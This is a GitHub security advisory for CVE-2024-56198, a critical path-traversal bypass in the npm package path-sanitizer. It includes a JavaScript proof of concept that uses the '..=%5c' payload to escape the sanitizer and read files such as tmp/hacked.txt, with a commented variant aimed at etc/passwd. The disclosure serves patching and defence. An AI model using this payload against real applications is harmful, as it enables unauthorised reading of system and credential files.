# [C] path-sanitizer allows bypassing the existing filters to achieve path-traversal vulnerability 

## Summary
Severity: Critical
Advisory: GHSA-94p5-r7cc-3rpr
CVE: CVE-2024-56198
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-01-02
Source: https://github.com/advisories/GHSA-94p5-r7cc-3rpr
Type: github-advisory

## Affected
- npm: `path-sanitizer` — affected >=0 <3.1.0

## Details
### Summary
This is a POC for a path-sanitizer [npm package](https://www.npmjs.com/package/path-sanitizer). The filters can be bypassed and can result in path traversal.

Payload: `..=%5c` can be used to bypass this on CLI (along with other candidates). Something similar would likely work on web apps as well. 

### PoC
Here's the code to test for the filter bypass:

```js
const sanitize = require("path-sanitizer")
const path = require("path")
const fs = require("fs")

// Real scenario:
function routeHandler(myPath) {
  // Lets just assume that the path was extracted from the request
  // We want to read a file in the C:\Users\user\Desktop\myApp\ directory
  // But the user should be able to access C:\Users\user\Desktop\
  // So we need to sanitize the path

  const APP_DIR = "/var/hacker"
  const sanitized = path.join(APP_DIR, sanitize(myPath))

  // Now we would usally read the file
  // But in this case we just gonna print the path
  // console.log(sanitized)
  return sanitized
}

function readFile(filePath) {
  const absolutePath = path.resolve(filePath) // Resolve to absolute path

  fs.readFile(absolutePath, "utf8", (err, data) => {
    if (err) {
      console.error(`Error reading the file: ${err.message}`)
      return
    }
    console.log(`Contents of the file ${filePath} :\n${data}`)
  })
}

input_user_bypass = "..=%5c..=%5c..=%5c..=%5c..=%5c..=%5c..=%5ctmp/hacked.txt"
// input_user_bypass = "..=%5c..=%5c..=%5c..=%5c..=%5c..=%5c..=%5cetc/passwd"
input_user_payload = "../../../../../../../../tmp/hacked.txt"

readFile(routeHandler(input_user_bypass))
readFile(routeHandler(input_user_payload))
```

Here is a video POC: (this is a Loom POC, only users with the UUID of the video can see it) 

https://www.loom.com/share/b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d

### Impact
Any CLI tool or library using this package can be/will be vulnerable to Path traversal.

## References
- https://github.com/cabraviva/path-sanitizer/security/advisories/GHSA-94p5-r7cc-3rpr
- https://nvd.nist.gov/vuln/detail/CVE-2024-56198
- https://github.com/cabraviva/path-sanitizer/commit/b6d2319eac910dffdfacc8460f5b5cc5a1518ead
- https://github.com/cabraviva/path-sanitizer
- https://www.loom.com/share/b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d
